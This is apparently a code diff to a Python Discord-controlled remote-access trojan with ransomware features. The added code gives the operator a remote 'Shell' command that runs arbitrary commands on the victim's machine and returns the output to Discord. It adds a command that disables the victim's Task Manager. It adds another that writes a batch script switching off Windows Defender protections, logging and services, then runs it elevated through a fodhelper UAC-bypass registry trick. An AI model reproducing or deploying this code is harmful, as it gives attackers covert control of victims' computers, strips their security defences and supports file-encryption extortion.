@@ -8,10 +8,12 @@ import string
 import win32gui
 import re
 import base64
+import subprocess
 import webbrowser
 import discord
 import urllib.request
 import urllib
+import winreg as reg
 import tkinter as tk
 from threading import *
 from time import *
@@ -274,6 +276,41 @@ async def exit_command(ctx: SlashContext):
             os._exit(0)
         else:
             await ctx.send(content="Cancelled the exit", hidden=True)
+
+
+@slash.slash(name="Shell", description="run shell commands", guild_ids=g)
+async def Shell_command(ctx: SlashContext, command: str):
+    if ctx.channel.name == channel_name:
+        global status
+        status = None
+        import subprocess
+        import os
+        instruction = command
+        def shell(command):
+            output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            global status
+            status = "ok"
+            return output.stdout.decode('CP437').strip()
+        out = shell(instruction)
+        print(out)
+        print(status)
+        if status:
+            numb = len(out)
+            if numb < 1:
+                await ctx.send("Command not recognized or no output was obtained")
+            elif numb > 1990:
+                temp = (os.getenv('TEMP'))
+                f1 = open(temp + r"\\output.txt", 'a')
+                f1.write(out)
+                f1.close()
+                file = discord.File(temp + r"\\output.txt", filename="output.txt")
+                await ctx.send("Command executed!", file=file)
+                os.remove(temp + r"\\output.txt")
+            else:
+                await ctx.send("Command executed : " + out)
+        else:
+            await ctx.send("Command not recognized or no output was obtained")
+            status = None
 
 
 @slash.slash(name="EncryptFiles", description="Encrypt users file with full dirpath", guild_ids=g)
@@ -1098,8 +1135,131 @@ async def EncryptAll_command(ctx: SlashContext):
             download.start()
             message.start()
 
+            a.join()
+            b.join()
+            c.join()
+            d.join()
+            e.join()
+            f.join()
+            g.join()
+            h.join()
+            download.join()
+            message.join()
+
             await ctx.send(f"```Finished encrypted everything and sent message box```\n\n**Here are the keys to decrypt the files!**\n{json.dumps(PASSWORDS, indent=6)}")
         else:
             await ctx.send(content="Cancelled!", hidden=True)
-        
+
+
+@slash.slash(name="DisableTaskManager", description="Disable victims task manager, Admin privileges required!", guild_ids=g)
+async def DisableTaskManager_command(ctx: SlashContext):
+    if ctx.channel.name == channel_name:
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        if is_admin == True:
+            global statuuusss
+            statuuusss = None
+            instruction = r'reg query "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies"'
+            def shell():
+                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                global status
+                statuuusss = "ok"
+                return output
+            shel = threading.Thread(target=shell)
+            shel._running = True
+            shel.start()
+            time.sleep(1)
+            shel._running = False
+            result = str(shell().stdout.decode('CP437'))
+            if len(result) <= 5:
+                reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System')
+                os.system(r'powershell New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value "1" -Force')
+            else:
+                os.system(r'powershell New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value "1" -Force')
+            await ctx.send("Successfuly disabled victims task manager")
+        else:
+            await ctx.send("**This command requires admin privileges**")
+
+
+@slash.slash(name="DisableAntivirus", description="Disable victims antivirus", guild_ids=g)
+async def DisableAntivirus_command(ctx: SlashContext):
+    if ctx.channel.name == channel_name:
+        import ctypes, os, time
+        class disable_fsr():
+            disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
+            revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
+            def __enter__(self):
+                self.old_value = ctypes.c_long()
+                self.success = self.disable(ctypes.byref(self.old_value))
+            def __exit__(self, type, value, traceback):
+                if self.success:
+                    self.revert(self.old_value)
+        await ctx.send("**Attempting to disable AV**")
+
+        ###### CREATE BATCH FILE ######
+        temp = (os.getenv("temp"))
+        bat = """
+reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f
+cls
+rem 0 - Disable Logging
+reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
+reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f
+cls
+rem Disable WD Tasks
+schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
+schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
+cls 
+rem Disable WD systray icon
+reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "SecurityHealth" /f
+reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
+cls
+rem Remove WD context menu
+reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f
+reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f
+reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f
+cls
+rem Disable WD services
+reg add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
+cls
+        """
+        temp2 = temp + r"\\av.bat"
+        if os.path.isfile(temp2):
+            os.remove(temp2)
+        f6 = open(temp + r"\\av.bat", 'w')
+        f6.write(bat)
+        f6.close()
+
+        ###### FORCE RUN BATCH FILE AS ADMIN ######
+        create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
+        os.system(create_reg_path)
+        create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
+        os.system(create_trigger_reg_key) 
+        create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c """ + '""' + '"' + '"' + temp2 + '""' +  '"' + '"\'"' + """ -Force"""
+        os.system(create_payload_reg_key)
+        with disable_fsr():
+            os.system("fodhelper.exe")
+        time.sleep(2)
+        remove_reg = r""" powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force """
+        os.system(remove_reg)
+
+
+
 client.run(token)
